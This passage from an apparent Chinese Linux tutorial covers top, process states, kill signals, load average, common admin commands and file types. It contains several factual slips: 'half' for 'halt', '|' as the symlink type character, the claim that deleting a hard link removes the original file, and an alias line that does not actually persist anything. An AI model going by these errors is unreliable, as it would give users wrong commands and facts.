<td><code>COMMAND</code></td>
<td>启动进程的命令（含参数时会截断显示，按 <code>c</code> 可显示完整路径）。</td>
</tr>
</tbody>
</table>
<h5 id="核心功能与快捷键">核心功能与快捷键</h5>
<p><code>top</code> 命令以交互式界面实时展示系统状态，支持以下核心操作：</p>
<ol>
<li class="lvl-3">
<p><strong>基础交互</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><code>h</code> 或 <code>?</code>：调出帮助文档，查看所有快捷键与功能说明。</li>
<li class="lvl-5"><code>q</code>：退出监控界面。</li>
<li class="lvl-5"><code>s</code> 或 <code>d</code>：调整刷新间隔（单位：秒），默认 3 秒刷新一次。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>资源排序</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><code>P</code>：按 CPU 使用率（<code>%CPU</code>）降序排序，快速定位高负载进程。</li>
<li class="lvl-5"><code>M</code>：按内存使用率（<code>%MEM</code>）降序排序，排查内存占用异常。</li>
<li class="lvl-5"><code>T</code>：按累计 CPU 时间（<code>TIME+</code>）排序，识别长期占用资源的进程。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>视图优化</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><code>1</code>：展开多核 CPU 视图，显示每个物理核心的负载详情（如 <code>%Cpu0</code>、<code>%Cpu1</code>）。</li>
<li class="lvl-5"><code>z</code>：启用颜色高亮，区分不同数据区域（如红色标记高负载进程）。</li>
<li class="lvl-5"><code>b</code>：高亮显示处于 <code>R</code>（运行）状态的进程，直观识别活跃任务。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>高级控制</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><code>k</code>：终止进程（输入 PID 后可指定信号，如 <code>9</code> 强制终止）。</li>
<li class="lvl-5"><code>r</code>：调整进程优先级（通过 <code>nice</code> 值，范围 -20~19，值越小优先级越高）。</li>
<li class="lvl-5"><code>c</code>：切换显示进程完整命令行（含参数），避免因名称截断导致的误判。</li>
</ul>
</li>
</ol>
<h5 id="关键指标与异常排查">关键指标与异常排查</h5>
<ol>
<li class="lvl-3">
<p><strong>性能瓶颈定位</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><strong>CPU 过载</strong>：若 <code>%CPU</code> 长期高于 80%，按 <code>P</code> 排序找出高负载进程，结合 <code>ps -fp &lt;PID&gt;</code> 分析代码逻辑或考虑扩容。</li>
<li class="lvl-5"><strong>内存泄漏</strong>：若 <code>%MEM</code> 持续增长且 <code>avail Mem</code> 下降，按 <code>M</code> 排序排查异常进程，使用 <code>pmap</code> 或 <code>valgrind</code> 分析内存分配。</li>
<li class="lvl-5"><strong>磁盘 I/O 瓶颈</strong>：若 <code>wa</code> 长期高于 10%，使用 <code>iotop</code> 定位高 I/O 进程，优化存储或升级硬件。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>进程状态异常</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><strong>僵尸进程（<code>Z</code> 状态）</strong>：终止父进程（<code>kill &lt;PPID&gt;</code>）或修复程序逻辑（确保调用 <code>wait()</code> 回收子进程资源）。</li>
<li class="lvl-5"><strong>不可中断进程（<code>D</code> 状态）</strong>：可能因磁盘 I/O 阻塞，使用 <code>strace</code> 跟踪系统调用或检查存储设备健康状态。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>虚拟化环境监控</strong></p>
<ul class="lvl-2">
<li class="lvl-5">若 <code>st</code> 持续高于 10%，表明宿主机资源不足，需迁移虚拟机或增加物理 CPU 核心。</li>
</ul>
</li>
</ol>
<h5 id="数据保存与高级用法">数据保存与高级用法</h5>
<ol>
<li class="lvl-3">
<p><strong>批处理模式记录日志</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">top -b -n 5 &gt; /tmp/top_monitor.log  <span class="comment"># 记录 5 次刷新结果到文件  </span></span><br></pre></td></tr></table></figure>
<ul class="lvl-2">
<li class="lvl-5">
<p><code>-b</code>：以批处理模式运行，适合脚本调用或离线分析。</p>
</li>
<li class="lvl-5">
<p><code>-n 5</code>：指定刷新次数，避免无限输出。</p>
</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>自定义显示字段</strong></p>
<ul class="lvl-2">
<li class="lvl-5">按 <code>f</code> 进入字段选择界面，通过方向键添加 / 删除字段（如 <code>CODE</code> 代码内存、<code>DATA</code> 数据段内存）。</li>
<li class="lvl-5">按 <code>o</code> 调整字段顺序（如将 <code>%CPU</code> 列移至首位）。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>多进程监控</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">top -p 1234,5678  <span class="comment"># 同时监控多个进程（PID 1234 和 5678）  </span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="进程状态（STAT）信息">进程状态（STAT）信息</h4>
<p>在 Linux 系统中，通过<code>ps</code>、<code>top</code>等命令查看进程时，状态标识（如<code>R</code>、<code>S</code>、<code>Z</code>等）直观反映了进程的当前行为。以下是各状态及相关符号的说明：</p>
<h5 id="核心状态标识"><strong>核心状态标识</strong></h5>
<p>进程状态由内核根据其资源占用、调度情况动态标记，核心状态标识（Process State Codes）如下：</p>
<ol>
<li class="lvl-3">
<p><strong><code>R</code>（Running / Runnable，运行状态）</strong><br>
进程处于 “可被 CPU 调度” 的状态：要么正在占用 CPU 执行指令，要么已就绪（等待 CPU 分配时间片）。此时进程位于内核的 “就绪队列” 中，是系统中 “活跃” 的典型代表。</p>
</li>
<li class="lvl-3">
<p><strong><code>S</code>（Interruptible Sleep，可中断休眠状态）</strong><br>
进程因等待某事件（如 I/O 操作完成、信号触发、定时器超时等）而暂停执行，此时不占用 CPU 资源。该状态可被外部信号（如<code>SIGINT</code>）中断并唤醒（例如通过<code>kill</code>命令发送信号）。</p>
<p>状态衍生符号（优先级相关）：</p>
<ul class="lvl-2">
<li class="lvl-5">
<p><code>S&lt;</code>：表示进程处于高优先级可中断休眠状态（优先级高于默认值），内核会优先调度其唤醒。</p>
</li>
<li class="lvl-5">
<p><code>SN</code>：表示进程处于低优先级可中断休眠状态（优先级低于默认值），调度优先级较低。</p>
</li>
</ul>
</li>
<li class="lvl-3">
<p><strong><code>T</code>（Stopped / Traced，停止 / 跟踪状态）</strong><br>
进程被主动暂停执行，通常由以下场景触发：</p>
<ul class="lvl-2">
<li class="lvl-5">收到暂停信号（如<code>SIGSTOP</code>），例如通过<code>Ctrl+z</code>暂停前台进程（如<code>ping 223.5.5.5</code>执行时，<code>Ctrl+z</code>会将其暂停为<code>T</code>状态）；</li>
<li class="lvl-5">被调试器（如<code>gdb</code>）跟踪，处于断点调试状态。</li>
</ul>
<p>该状态的进程可通过<code>SIGCONT</code>信号恢复运行（如<code>fg</code>命令将后台暂停进程调至前台），适用于暂不明确进程作用时 —— 先暂停而非直接<code>kill</code>，降低误操作风险。</p>
<p>操作示例：</p>
<ul class="lvl-2">
<li class="lvl-5">
<p>暂停进程：<code>ping 223.5.5.5</code>执行中按<code>Ctrl+z</code>，进程进入<code>T</code>状态；</p>
</li>
<li class="lvl-5">
<p>查看暂停任务：<code>jobs</code>命令（仅显示当前终端会话创建的任务）；</p>
</li>
<li class="lvl-5">
<p>恢复进程：<code>fg %1</code>（将编号为 1 的暂停任务调至前台继续运行）；</p>
</li>
<li class="lvl-5">
<p>彻底终止：<code>Ctrl+c</code>直接终止前台进程，或<code>kill</code>命令发送终止信号。</p>
</li>
</ul>
</li>
<li class="lvl-3">
<p><strong><code>D</code>（Uninterruptible Sleep，不可中断休眠状态）</strong><br>
进程因等待 “不可中断的系统资源”（如磁盘 I/O、硬件设备响应）而进入深度休眠，<strong>不响应任何外部信号</strong>（包括<code>kill -9</code>）。其设计目的是确保关键资源操作的原子性（如 MySQL 执行大量数据写入时，需等待磁盘同步完成，避免数据一致性问题）。</p>
<p>注意：<code>D</code>状态进程虽不直接占用 CPU，但会锁定相关资源，若长期存在可能暗示硬件故障（如磁盘读写超时）。</p>
</li>
<li class="lvl-3">
<p><strong><code>Z</code>（Zombie，僵尸状态）</strong><br>
子进程已终止（退出），但父进程未调用<code>wait()</code>系列系统调用回收其资源（如进程 ID、退出状态等），导致其残留于进程表中。僵尸进程不占用 CPU、内存等实际资源，但会消耗进程表项（系统进程 ID 数量有限），积累过多可能导致新进程无法创建。</p>
</li>
</ol>
<h5 id="状态辅助符号">状态辅助符号</h5>
<p>除核心状态外，<code>ps</code>命令还会显示以下符号，用于描述进程的附加属性：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>s</code>：进程为<strong>会话首进程</strong>（Session Leader），通常是进程组的父进程，负责管理整个进程组的生命周期（如终端启动的命令进程多为会话首进程）。</p>
</li>
<li class="lvl-2">
<p><code>&lt;</code>：进程运行在<strong>高优先级</strong>（对应<code>S&lt;</code>状态，优先级值低于默认，Linux 优先级范围为 - 20~19，值越小优先级越高）。</p>
</li>
<li class="lvl-2">
<p><code>N</code>：进程运行在<strong>低优先级</strong>（对应<code>SN</code>状态，优先级值高于默认）。</p>
</li>
<li class="lvl-2">
<p><code>+</code>：进程属于<strong>前台进程组</strong>，直接接收终端输入（如当前终端执行的<code>ls</code>命令进程）。</p>
</li>
<li class="lvl-2">
<p><code>l</code>：进程包含<strong>多个线程</strong>（Lightweight Process），多线程进程可并行处理多个任务（如微信同时运行文字聊天、视频通话等功能，分别由不同线程执行），提升 CPU 利用率与响应速度。</p>
</li>
</ul>
<p>结合<code>ps</code>、<code>top</code>等工具查看进程状态变化，通过状态标识可快速判断进程是否正常运行、是否存在资源竞争、是否需要干预（如终止僵尸进程、排查 D 状态进程的资源瓶颈）。</p>
<h4 id="进程控制：kill-命令">进程控制：kill 命令</h4>
<p><code>kill</code> 命令通过向进程发送 <strong>信号（signal）</strong> 实现进程控制（终止、暂停、重启等），核心语法为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> [参数] &lt;进程标识符（PID）&gt;</span><br></pre></td></tr></table></figure>
<h5 id="核心参数说明">核心参数说明</h5>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>-l</code>：列出所有可用信号（共 64 种，格式如 <code>1) SIGHUP 9) SIGKILL</code>）。</p>
</li>
<li class="lvl-2">
<p><code>-s &lt;信号&gt;</code>：指定发送的信号（可用名称或编号，如 <code>-s SIGKILL</code> 或 <code>-9</code>）。</p>
</li>
<li class="lvl-2">
<p><code>-p</code>：仅输出目标进程的 PID，不发送任何信号（用于验证进程存在性）。</p>
</li>
</ul>
<h5 id="常用信号及场景">常用信号及场景</h5>
<table>
<thead>
<tr>
<th>信号名称</th>
<th>编号</th>
<th>功能说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SIGHUP</code></td>
<td>1</td>
<td>通知进程重新加载配置文件（如 <code>nginx</code> 服务重载）。</td>
</tr>
<tr>
<td><code>SIGINT</code></td>
<td>2</td>
<td>中断进程（通常由 <code>Ctrl+C</code> 触发，可被进程捕获处理）。</td>
</tr>
<tr>
<td><code>SIGKILL</code></td>
<td>9</td>
<td>强制终止进程（不可被捕获或忽略，适用于无法正常终止的进程）。</td>
</tr>
<tr>
<td><code>SIGTERM</code></td>
<td>15</td>
<td>优雅终止进程（默认信号，允许进程释放资源后退出，优先推荐使用）。</td>
</tr>
<tr>
<td><code>SIGSTOP</code></td>
<td>19</td>
<td>暂停进程（不可被忽略，需配合 <code>SIGCONT</code> 恢复）。</td>
</tr>
<tr>
<td><code>SIGCONT</code></td>
<td>18</td>
<td>恢复被 <code>SIGSTOP</code> 暂停的进程。</td>
</tr>
</tbody>
</table>
<h5 id="注意事项">注意事项</h5>
<ol>
<li class="lvl-3">
<p><strong>权限要求</strong>：仅进程所有者或 <code>root</code> 可发送信号（普通用户无法终止其他用户的进程）。</p>
</li>
<li class="lvl-3">
<p><strong>强制终止风险</strong>：<code>SIGKILL</code>（信号 9）可能导致数据丢失（如未保存的文件），尤其对存储服务（如数据库）需谨慎使用。</p>
</li>
<li class="lvl-3">
<p><strong>信号重试</strong>：部分守护进程可能忽略 <code>SIGTERM</code>，可先尝试 <code>SIGTERM</code>，无效再用 <code>SIGKILL</code>。</p>
</li>
</ol>
<h4 id="系统平均负载">系统平均负载</h4>
<p>平均负载定义为 <strong>单位时间内，系统中处于「可运行状态（R）」和「不可中断状态（D）」的平均进程数</strong>（即<strong>活跃进程数</strong>），与 CPU 使用率无直接关联：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>可运行状态（R）</strong>：正在占用 CPU，或等待 CPU 调度的进程（<code>ps</code>命令可见）。</p>
</li>
<li class="lvl-2">
<p><strong>不可中断状态（D）</strong>：等待硬件 I/O 响应的进程（如磁盘写入时的保护机制，中断会导致数据一致性问题，<code>ps</code>命令可见为<code>D</code>状态）。</p>
</li>
</ul>
<h5 id="系统平均负载的合理范围">系统平均负载的合理范围</h5>
<p>系统平均负载的合理范围与 CPU 核心数强绑定。理想状态：<strong>平均负载 ≈ CPU 核心数</strong>（每个核心恰好运行 1 个进程）。不同核心数下，相同负载的意义截然不同：</p>
<table>
<thead>
<tr>
<th>CPU 核心数</th>
<th>平均负载 = 2 的含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>4 核</td>
<td>CPU 使用率 50%（50% 资源空闲）</td>
</tr>
<tr>
<td>2 核</td>
<td>CPU 使用率 100%（资源刚好用满）</td>
</tr>
<tr>
<td>1 核</td>
<td>CPU 使用率 200%（50% 进程需等待 CPU）</td>
</tr>
</tbody>
</table>
<h5 id="时间维度的解读">时间维度的解读</h5>
<p>平均负载包含 <strong>1 分钟、5 分钟、15 分钟</strong> 三个值，需结合判断趋势：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>三者接近</strong> → 负载平稳；</p>
</li>
<li class="lvl-2">
<p><strong>1 分钟值 ≫ 15 分钟</strong> → 近期负载突增（需紧急排查）；</p>
</li>
<li class="lvl-2">
<p><strong>1 分钟值 ≪ 15 分钟</strong> → 近期负载下降（关注历史瓶颈）。</p>
</li>
</ul>
<p><strong>告警建议</strong>：当平均负载超过 CPU 核心数的 70% 时，建议介入分析（需结合历史数据动态调整阈值）。</p>
<h5 id="与-CPU-使用率的区别">与 CPU 使用率的区别</h5>
<p>平均负载涵盖 <strong>等待 CPU、等待 I/O、进程调度</strong> 的进程，而 CPU 使用率仅统计 CPU 繁忙程度，二者在不同场景下表现不同：</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>负载升高场景</th>
<th>平均负载变化</th>
<th>use%</th>
<th>sys%</th>
<th>wait%</th>
<th>CPU 整体使用率</th>
<th>磁盘 IO 消耗</th>
</tr>
</thead>
<tbody>
<tr>
<td>01</td>
<td>CPU 密集型进程</td>
<td>升高</td>
<td>消耗多</td>
<td>消耗少</td>
<td>消耗少</td>
<td>使用率高（某个核心）</td>
<td>磁盘消耗小</td>
</tr>
<tr>
<td>02</td>
<td>IO 密集型进程</td>
<td>升高</td>
<td>消耗少</td>
<td>消耗多</td>
<td>消耗多</td>
<td>使用率低</td>
<td>磁盘消耗大</td>
</tr>
<tr>
<td>03</td>
<td>大量进程产生</td>
<td>升高</td>
<td>消耗多</td>
<td>消耗少</td>
<td>消耗多</td>
<td>使用率高（所有核心）</td>
<td>磁盘消耗小</td>
</tr>
</tbody>
</table>
<h5 id="问题排查核心思路">问题排查核心思路</h5>
<ol>
<li class="lvl-3">
<p><strong>查看负载</strong>：通过 <code>uptime</code>/<code>top</code> 获取 1/5/15 分钟负载值，判断趋势。</p>
</li>
<li class="lvl-3">
<p><strong>分析 CPU</strong>：用 <code>mpstat</code> 查看多核负载、iowait 等指标，定位瓶颈类型（CPU 计算 / IO 等待）。</p>
</li>
<li class="lvl-3">
<p><strong>定位进程</strong>：通过 <code>pidstat</code>/<code>top</code> 追踪高负载进程（CPU/IO 占用异常的进程）。</p>
</li>
<li class="lvl-3">
<p><strong>日志溯源</strong>：结合进程所属服务的日志，分析代码逻辑或资源配置问题。</p>
</li>
</ol>
<p><strong>压力测试与监控工具</strong>：</p>
<p>stress是Linux系统压力测试工具，可以用作异常进程模拟平均负载升高的场景。</p>
<p>mpstat:是多核CPU性能分析工具，用来实时查看每个CPU的性能指标，以及所有CPU的平均指标;</p>
<p>pidstat:是常用的进程性能分析工具，用来实时查看进程的CPU、内存、1/0以及上下文切换等性能指标;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y sysstat stress  <span class="comment"># sysstat含mpstat/pidstat，stress用于压力测试</span></span><br></pre></td></tr></table></figure>
<h3 id="系统管理命令">系统管理命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># history 查看历史命令</span></span><br><span class="line"><span class="built_in">history</span> -c   <span class="comment">#清除历史记录（慎用）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#关机命令 --关闭虚拟系统</span></span><br><span class="line">shutdown -h now    <span class="comment">#立即关机</span></span><br><span class="line">shutdown -h 0      <span class="comment">#立即关机</span></span><br><span class="line">shutdown -h now    <span class="comment">#立即关机</span></span><br><span class="line">shutdown -h 5      <span class="comment">#五分钟之后关机</span></span><br><span class="line">init 0             <span class="comment">#立即关机</span></span><br><span class="line">half               <span class="comment">#立即关机</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启命令</span></span><br><span class="line">shutdown -r 0/now  <span class="comment">#立即重启</span></span><br><span class="line">init 6             <span class="comment">#立即重启</span></span><br><span class="line">reboot             <span class="comment">#立即重启</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改主机名（修改之后要bash命令刷新）</span></span><br><span class="line">hostname name   <span class="comment">#临时修改</span></span><br><span class="line">hostnamectl set-hostname name  <span class="comment">#永久修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2&gt; 错误重定向</span></span><br><span class="line"><span class="built_in">command</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment">#which 查找$PATH中设置命令及安装文件目录所在位置</span></span><br><span class="line"><span class="built_in">which</span> <span class="built_in">cat</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export 设置环境变量，使其在当前 shell 及子进程中生效</span></span><br><span class="line"><span class="comment">#临时设置</span></span><br><span class="line"><span class="built_in">export</span> NAME                <span class="comment"># 导出已存在的变量为环境变量</span></span><br><span class="line"><span class="built_in">export</span> NAME=value          <span class="comment"># 定义并导出变量 “=”两侧不能有空格</span></span><br><span class="line">NAME=value; <span class="built_in">export</span> NAME    <span class="comment"># 等价写法</span></span><br><span class="line"><span class="built_in">unset</span> NAME                 <span class="comment"># 删除变量</span></span><br><span class="line"><span class="comment">#永久设置</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export JAVA_HOME=&quot;/opt/java&quot;&#x27;</span> &gt;&gt; /etc/profile   <span class="comment"># 对所有用户生效</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=&quot;$PATH:~/.local/bin&quot;&#x27;</span> &gt;&gt; ~/.bashrc  <span class="comment"># 仅对当前用户生效</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#env</span></span><br><span class="line"><span class="built_in">env</span> | grep NAME      <span class="comment"># 检查环境变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#alternatives 管理系统命令的多版本实现，避免文件冲突</span></span><br><span class="line">alternatives --config &lt;命令名&gt;        <span class="comment"># 手动选择版本</span></span><br><span class="line">alternatives --remove &lt;名称&gt; &lt;路径&gt;   <span class="comment"># 移除版本</span></span><br><span class="line">alternatives --display &lt;名称&gt;        <span class="comment"># 查看所有可用版本</span></span><br><span class="line">alternatives --install &lt;链接&gt; &lt;名称&gt; &lt;路径&gt; &lt;优先级&gt;  <span class="comment"># 添加新版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#crontab 设置周期性执行的任务</span></span><br><span class="line">crontab -e	        <span class="comment">#编辑当前用户的 cron 表（首次使用会选择编辑器）。</span></span><br><span class="line">crontab -l	        <span class="comment">#列出当前用户的所有定时任务。</span></span><br><span class="line">crontab -r	        <span class="comment">#删除当前用户的所有定时任务（谨慎使用）。</span></span><br><span class="line">crontab -u user -e	<span class="comment">#以 root 身份编辑指定用户的 cron 表（需 root 权限）。</span></span><br><span class="line"><span class="comment">#时间格式：[分钟] [小时] [日期] [月份] [星期] command</span></span><br><span class="line"><span class="comment">#通配符与特殊符号：&quot;*&quot;：匹配所有值 | &quot;,&quot;：分隔多个值 | &quot;-&quot;：指定范围 | &quot;/&quot;：指定间隔</span></span><br><span class="line"><span class="comment">#相对时间：@daily | @weekly | @monthly | @reboot</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free  查看空间使用情况</span></span><br><span class="line">free -h</span><br><span class="line"></span><br><span class="line"><span class="comment"># df 查看磁盘使用情况</span></span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"></span><br><span class="line"><span class="comment">#ps</span></span><br><span class="line">a     <span class="comment"># 显示现行终端机下的所有程序，包括其他用户的程序。</span></span><br><span class="line">-A    <span class="comment"># 显示所有程序。</span></span><br><span class="line">c     <span class="comment"># 列出程序时，显示每个程序真正的指令名称，而不包含路 径，参数或常驻服务的标示。</span></span><br><span class="line">-e    <span class="comment"># 此参数的效果和指定&quot;A&quot;参数相同。</span></span><br><span class="line">e     <span class="comment"># 列出程序时，显示每个程序所使用的环境变量。</span></span><br><span class="line">f     <span class="comment"># 用ASCII字符显示树状结构，表达程序间的相互关系。</span></span><br><span class="line">-H    <span class="comment"># 显示树状结构，表示程序间的相互关系。</span></span><br><span class="line">-N    <span class="comment"># 显示所有的程序，除了执行ps指令终端机下的程序之外。</span></span><br><span class="line">s     <span class="comment"># 采用程序信号的格式显示程序状况。</span></span><br><span class="line">u     <span class="comment"># 以用户为主的格式来显示程序状况。</span></span><br><span class="line">x     <span class="comment"># 显示所有程序，不以终端机来区分</span></span><br><span class="line">ps aux   <span class="comment">#USER, PID, %CPU, %MEM, VSZ, RSS, TTY, STAT, START, TIME, COMMAND</span></span><br><span class="line">ps -ef   <span class="comment">#UID, PID, PPID, C, STIME, TTY, TIME, CMD</span></span><br><span class="line"><span class="comment"># 若关注资源占用和用户名，用 ps aux；若需分析进程关系或用户 ID，用 ps -ef</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置别名</span></span><br><span class="line"><span class="built_in">alias</span> eth0=<span class="string">&#x27;cat /etc/sysconfig/network-scripts/ifcfg-ens33&#x27;</span></span><br><span class="line"><span class="comment">#取消别名</span></span><br><span class="line"><span class="built_in">unalias</span> eth0</span><br><span class="line"><span class="comment">#永久设置</span></span><br><span class="line"><span class="built_in">alias</span> eth0=<span class="string">&#x27;cat /etc/sysconfig/network-scripts/ifcfg-eth0&#x27;</span> &gt;&gt; /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">#timedatectl  --修改时区信息，以及显示系统时间   内容比较详细</span></span><br><span class="line"><span class="comment">#date    --快速简介显示时间信息</span></span><br><span class="line"><span class="comment">#&quot;%Y&quot; 年year| &quot;%m&quot; 月mouth | &quot;%d&quot; 日day | &quot;%H&quot; 时hour | &quot;%M&quot; 分min | &quot;%S&quot; 秒sec | &quot;%F&quot; 年-月-日 </span></span><br><span class="line"><span class="built_in">touch</span> `<span class="built_in">date</span> +%F`.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#jobs bg fg</span></span><br><span class="line"><span class="built_in">jobs</span>   <span class="comment">#用于查看后台运行启动</span></span><br><span class="line"><span class="built_in">bg</span>     <span class="comment">#将进程信息放入后台运行</span></span><br><span class="line"><span class="built_in">fg</span>     <span class="comment">#将进程信息放入前台运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#uname [选项]</span></span><br><span class="line">-a 或 --all	             <span class="comment">#显示全部系统信息，涵盖系统名称、主机名、内核版本、处理器类型等内容。</span></span><br><span class="line">-s 或 --kernel-name	     <span class="comment">#显示内核名称，像 Linux、Darwin（macOS）等。</span></span><br><span class="line">-n 或 --nodename	         <span class="comment">#显示主机名，也就是计算机在网络中的标识名称。</span></span><br><span class="line">-r 或 --kernel-release	 <span class="comment">#显示内核版本号，例如 5.15.0-76-generic。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> /var/log/messages    <span class="comment">#查看系统报错日志</span></span><br></pre></td></tr></table></figure>
<h2 id="文件管理">文件管理</h2>
<h3 id="文件类型">文件类型</h3>
<p><img src="/posts/2c8b313c//image-20250714181833893.png" alt="image-20250714181833893"></p>
<p>①文件属性索引节点 --inode(唯一的)–身份证号<br>
②文件属性信息和文件权限信息<br>
③文件硬链接数:查看文件数据信息的多个门(类似于挂载)<br>
④文件属主信息:文件管理者/文件创建者<br>
⑤文件属组信息/所属用户组信息: 便于进行权限整体分配<br>
⑥文件数据信息大小尺寸<br>
⑦文件数据最后修改时间信息（Mtime）</p>
<p>文件类型:告诉系统管理者这个文件是什么类型 f(-) d c b s p l</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th style="text-align:center">字符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>普通文件</td>
<td style="text-align:center">-</td>
<td>文本 图片等</td>
</tr>
<tr>
<td>目录文件</td>
<td style="text-align:center">d</td>
<td>目录</td>
</tr>
<tr>
<td>链接字文件</td>
<td style="text-align:center">|</td>
<td>==Windows 桌面快捷方式</td>
</tr>
<tr>
<td>块设备文件</td>
<td style="text-align:center">b</td>
<td>存储数据以供系统存取的接口设备，简单而言就是硬盘。</td>
</tr>
<tr>
<td>字符设备文件</td>
<td style="text-align:center">c</td>
<td>即串行端口的接口设备，例如键盘、鼠标等等。</td>
</tr>
<tr>
<td>套接字文件</td>
<td style="text-align:center">s</td>
<td>这类文件通常用在网络数据连接。可以启动一个程序来监听客户端的要求，客户端就可以通过套接字来进行数据通信。第一个属性为 [s]，最常在 /var/run目录中看到这种文件类型</td>
</tr>
<tr>
<td>管道文件</td>
<td style="text-align:center">p</td>
<td>FIFO也是一种特殊的文件类型，它主要的目的是，解决多个程序同时存取一个文件所造成的错误。FIFO是first-in-first-out(先进先出)的缩写。</td>
</tr>
</tbody>
</table>
<p><img src="/posts/2c8b313c//image-20250719173617460.png" alt="image-20250719173617460"></p>
<p>软连接与硬链接：</p>
<p>软连接 l</p>
<p>硬链接 f</p>
<p>软连接：可以方便调取数据信息</p>
<p>复制连接的时候注意 复制的原文件的inode 是真实的文件</p>
<p>注意： 软链接的inode 和原文件的inode 是不一样的</p>
<p>​    硬链接的inode和原文件的inode是完全一样的</p>
<p>软链接是一个新的文件  删除不会有影响</p>
<p>删除硬链接会删除原文件（如果有多个硬链接，删除到最后一个硬链接会删除原文件）</p>
<p>修改硬链接 即修改原文件</p>
<h3 id="文件管理命令">文件管理命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1 mkdir</span></span><br><span class="line"><span class="built_in">mkdir</span> directionName     <span class="comment">#创建目录</span></span><br><span class="line"><span class="built_in">mkdir</span> &#123;src,tools&#125;       <span class="comment">#同时创建两个文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> -p a/b/c/         <span class="comment">#创建多级目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2 ls ll</span></span><br><span class="line"><span class="built_in">ls</span> -l    <span class="comment">#查看目录下的文件属性信息  等于ll</span></span><br><span class="line"><span class="built_in">ls</span> -lh   <span class="comment">#以人类可读方式显示文件大小信息  等于ll -h</span></span><br><span class="line"><span class="built_in">ls</span> -a    <span class="comment">#查看目录下所有的数据信息 包含隐藏文件</span></span><br><span class="line"><span class="built_in">ls</span> -li   <span class="comment">#查看文件属性索引节点indode  等于ll -i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3 cd    #带&#x27;/&#x27;绝对路径，不带&#x27;/&#x27;相对路径</span></span><br><span class="line"><span class="built_in">cd</span> ~     <span class="comment">#返回家目录 或直接 cd</span></span><br><span class="line"><span class="built_in">cd</span> /     <span class="comment">#返回根目录</span></span><br><span class="line"><span class="built_in">cd</span> ..    <span class="comment">#切换至上级目录</span></span><br><span class="line"><span class="built_in">cd</span> -     <span class="comment">#切换至上次所在目录</span></span><br><span class="line"><span class="built_in">cd</span> ~user <span class="comment">#进入到用户根目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwd    #查看当前所在目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#4 rm</span></span><br><span class="line"><span class="built_in">rm</span> -r filename filename   <span class="comment">#递归删除</span></span><br><span class="line"><span class="built_in">rm</span> -f     <span class="comment">#强制删除（无需确认）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#5 cp</span></span><br><span class="line"><span class="built_in">cp</span>  /路径/旧文件  /路径/新文件</span><br><span class="line"><span class="built_in">cp</span>  -r  /路径/目录   /路径/目录 <span class="comment">#拷贝目录下的所有文件到另一目录</span></span><br><span class="line">-a      <span class="comment">#保持文件原有属性，该选项通常在复制目录时使用，它保留链接、文件属性，并递归地复制目录</span></span><br><span class="line"><span class="built_in">cp</span> a.txt b.txt <span class="comment">#拷贝并改名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#6 mv</span></span><br><span class="line"><span class="built_in">mv</span>  文件/目录  新目录/</span><br><span class="line"><span class="built_in">mv</span> a b   <span class="comment">#修改文件名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#7 touch</span></span><br><span class="line"><span class="built_in">touch</span> filename   <span class="comment">#创建新文件</span></span><br><span class="line"><span class="built_in">touch</span> &#123;filename1,filename2&#125;  <span class="comment">#同时创建</span></span><br><span class="line"><span class="built_in">touch</span> &#123;1..5&#125;.txt <span class="comment">#创建1.txt 2.txt 3.txt 4.txt 5.txt </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#8 cat</span></span><br><span 